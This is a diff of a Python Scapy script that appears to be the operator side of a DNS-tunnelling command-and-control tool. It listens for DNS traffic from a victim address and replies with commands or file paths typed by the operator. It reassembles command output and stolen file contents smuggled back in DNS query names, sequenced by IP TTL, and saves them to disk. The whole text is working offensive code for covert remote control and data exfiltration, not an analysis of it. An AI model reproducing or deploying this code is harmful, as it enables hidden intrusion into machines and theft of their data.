@@ -16,21 +16,26 @@ seqnum = 64
 str_to_print = ""
 file_buff = bytes(str_to_print.encode())
 
-def printFileHandler(pkt, input_seq,payload, strfile_buff):
-    global seqnum
+def printFileHandler(pkt, input_seq,payload, flag):
+    global seqnum,str_to_print,file_buff
+    print(flag)
+    print(seqnum, input_seq)
     if seqnum == input_seq:
-        strfile_buff += payload
+        if flag == 2:
+            str_to_print += payload
+        else :
+            file_buff += payload
         seqnum = seqnum + 1
         if seqnum == 255:
             seqnum = 64
 
-    sendDNSRes(pkt, "ok", "1")
+    sendDNSRes(pkt, "ok", str(flag))
 
     
  
   
 def endFileHandler(pkt, input_seq, payload):
-    global file_buff
+    global file_buff, seqnum
     if input_seq == seqnum:
         filename = input("enter file name: \n")
         file_buff += payload
@@ -38,7 +43,7 @@ def endFileHandler(pkt, input_seq, payload):
         with open(filename, "wb") as file:
             file.write(file_buff)
         file_buff = bytes("".encode())
-    sendDNSRes(pkt, "ok", "0")
+    sendDNSRes(pkt, "ok", "3")
 
 
 def endPrintHandler(pkt, input_seq,payload):
@@ -49,16 +54,15 @@ def endPrintHandler(pkt, input_seq,payload):
         print(str_to_print)
         str_to_print = ""
 
-    sendDNSRes(pkt, "ok", "0")
-    
-
+    sendDNSRes(pkt, "ok", "4")
+ 
 
 def HelloHandler(packet):
-    flag_fileOrPrint = input("for file choose 1, for print choose 2:\n")
+    flag_fileOrPrint = input("for file choose 1\nfor print choose 2\n")
     if flag_fileOrPrint == "1":
-        res = input("enter file path.")
+        res = input("enter file path.\n")
     if flag_fileOrPrint == "2":
-        res = input("enter command")
+        res = input("enter command\n")
     sendDNSRes(packet ,res, flag_fileOrPrint)
  
 def sendDNSRes(packet, payload, flag):
@@ -84,25 +88,43 @@ def sendDNSRes(packet, payload, flag):
     time.sleep(0.5)
     send(response_packet)
 
- 
+def listenRes():
+    while True:
+        sniff(filter="udp and src host 10.0.2.4", prn=DNSHandler, timeout=5)
 
 def DNSHandler(pkt):
     global str_to_print, file_buff
-    payload = pkt[0]['DNS']['DNSRR'].rdata[0].decode()   
+    #if it's a file do not decode - 0 for file
+    
+    fileOrPrint = pkt[0]['DNS'].tc
+    
+    if fileOrPrint == 0:
+        payload = pkt[0]['DNS']['DNSQR'].qname.split(".elad.com".encode())[0]
+        handle_flag = str(payload[0]-48)
+    else:
+        payload = pkt[0]['DNS']['DNSQR'].qname.decode().split(".elad.com")[0]
+        handle_flag = payload[0]
+        
     victimseq = pkt[0]['IP'].ttl
-    handle_flag = payload[0]
-
+    
+    
+    print(handle_flag)
+    
     match handle_flag:
         case "1":
-            printFileHandler(pkt,victimseq, payload[1:], str_to_print)
+            printFileHandler(pkt,victimseq, payload[1:],1)
         case "2":
-            printFileHandler(pkt, victimseq, payload[1:], file_buff)
-        case "3":
-            endPrintHandler(payload[1:])
+            printFileHandler(pkt, victimseq, payload[1:],2)
         case "4":
-            endFileHandler(payload[1:])
-        case "5":
+            endPrintHandler(pkt, victimseq, payload[1:])
+        case "3":
+            endFileHandler(pkt, victimseq, payload[1:])
+        case "8":
             HelloHandler(pkt)
  
+
+def main():
+    listenRes()
+    
 if __name__ == "__main__":
     main()
